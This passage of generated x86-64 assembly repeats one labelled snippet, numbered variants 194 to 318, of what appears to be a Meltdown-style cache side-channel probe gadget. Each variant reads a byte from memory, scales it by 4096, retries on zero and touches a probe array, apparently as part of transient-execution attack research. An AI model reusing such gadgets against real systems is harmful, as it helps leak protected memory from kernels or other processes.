	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 194
.Lprobe_one_win0_var194:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 195
.Lprobe_one_win0_var195:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 196
.Lprobe_one_win0_var196:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 197
.Lprobe_one_win0_var197:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 198
.Lprobe_one_win0_var198:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 199
.Lprobe_one_win0_var199:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 200
.Lprobe_one_win0_var200:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 201
.Lprobe_one_win0_var201:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 202
.Lprobe_one_win0_var202:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 203
.Lprobe_one_win0_var203:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 204
.Lprobe_one_win0_var204:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 205
.Lprobe_one_win0_var205:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 206
.Lprobe_one_win0_var206:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 207
.Lprobe_one_win0_var207:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 208
.Lprobe_one_win0_var208:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 209
.Lprobe_one_win0_var209:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 210
.Lprobe_one_win0_var210:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 211
.Lprobe_one_win0_var211:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 212
.Lprobe_one_win0_var212:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 213
.Lprobe_one_win0_var213:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 214
.Lprobe_one_win0_var214:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 215
.Lprobe_one_win0_var215:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 216
.Lprobe_one_win0_var216:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 217
.Lprobe_one_win0_var217:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 218
.Lprobe_one_win0_var218:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 219
.Lprobe_one_win0_var219:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 220
.Lprobe_one_win0_var220:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 221
.Lprobe_one_win0_var221:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 222
.Lprobe_one_win0_var222:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 223
.Lprobe_one_win0_var223:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 224
.Lprobe_one_win0_var224:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 225
.Lprobe_one_win0_var225:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 226
.Lprobe_one_win0_var226:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 227
.Lprobe_one_win0_var227:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 228
.Lprobe_one_win0_var228:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 229
.Lprobe_one_win0_var229:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 230
.Lprobe_one_win0_var230:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 231
.Lprobe_one_win0_var231:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 232
.Lprobe_one_win0_var232:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 233
.Lprobe_one_win0_var233:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 234
.Lprobe_one_win0_var234:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 235
.Lprobe_one_win0_var235:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 236
.Lprobe_one_win0_var236:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 237
.Lprobe_one_win0_var237:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 238
.Lprobe_one_win0_var238:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 239
.Lprobe_one_win0_var239:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 240
.Lprobe_one_win0_var240:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 241
.Lprobe_one_win0_var241:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 242
.Lprobe_one_win0_var242:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 243
.Lprobe_one_win0_var243:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 244
.Lprobe_one_win0_var244:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 245
.Lprobe_one_win0_var245:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 246
.Lprobe_one_win0_var246:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 247
.Lprobe_one_win0_var247:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 248
.Lprobe_one_win0_var248:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 249
.Lprobe_one_win0_var249:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 250
.Lprobe_one_win0_var250:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 251
.Lprobe_one_win0_var251:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 252
.Lprobe_one_win0_var252:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 253
.Lprobe_one_win0_var253:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 254
.Lprobe_one_win0_var254:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 255
.Lprobe_one_win0_var255:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 256
.Lprobe_one_win0_var256:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 257
.Lprobe_one_win0_var257:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 258
.Lprobe_one_win0_var258:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 259
.Lprobe_one_win0_var259:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 260
.Lprobe_one_win0_var260:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 261
.Lprobe_one_win0_var261:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 262
.Lprobe_one_win0_var262:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 263
.Lprobe_one_win0_var263:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 264
.Lprobe_one_win0_var264:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 265
.Lprobe_one_win0_var265:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 266
.Lprobe_one_win0_var266:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 267
.Lprobe_one_win0_var267:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 268
.Lprobe_one_win0_var268:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 269
.Lprobe_one_win0_var269:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 270
.Lprobe_one_win0_var270:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 271
.Lprobe_one_win0_var271:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 272
.Lprobe_one_win0_var272:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 273
.Lprobe_one_win0_var273:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 274
.Lprobe_one_win0_var274:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 275
.Lprobe_one_win0_var275:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 276
.Lprobe_one_win0_var276:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 277
.Lprobe_one_win0_var277:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 278
.Lprobe_one_win0_var278:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 279
.Lprobe_one_win0_var279:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 280
.Lprobe_one_win0_var280:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 281
.Lprobe_one_win0_var281:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 282
.Lprobe_one_win0_var282:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 283
.Lprobe_one_win0_var283:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 284
.Lprobe_one_win0_var284:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 285
.Lprobe_one_win0_var285:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 286
.Lprobe_one_win0_var286:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 287
.Lprobe_one_win0_var287:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 288
.Lprobe_one_win0_var288:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 289
.Lprobe_one_win0_var289:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 290
.Lprobe_one_win0_var290:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 291
.Lprobe_one_win0_var291:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 292
.Lprobe_one_win0_var292:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 293
.Lprobe_one_win0_var293:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 294
.Lprobe_one_win0_var294:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 295
.Lprobe_one_win0_var295:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 296
.Lprobe_one_win0_var296:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 297
.Lprobe_one_win0_var297:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 298
.Lprobe_one_win0_var298:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 299
.Lprobe_one_win0_var299:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 300
.Lprobe_one_win0_var300:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 301
.Lprobe_one_win0_var301:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 302
.Lprobe_one_win0_var302:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 303
.Lprobe_one_win0_var303:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 304
.Lprobe_one_win0_var304:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 305
.Lprobe_one_win0_var305:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 306
.Lprobe_one_win0_var306:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 307
.Lprobe_one_win0_var307:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 308
.Lprobe_one_win0_var308:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 309
.Lprobe_one_win0_var309:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 310
.Lprobe_one_win0_var310:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 311
.Lprobe_one_win0_var311:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 312
.Lprobe_one_win0_var312:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 313
.Lprobe_one_win0_var313:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 314
.Lprobe_one_win0_var314:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 315
.Lprobe_one_win0_var315:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 316
.Lprobe_one_win0_var316:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 317
.Lprobe_one_win0_var317:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 318
.Lprobe_one_win0_var318:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 319
.Lprobe_one_win0_var319:
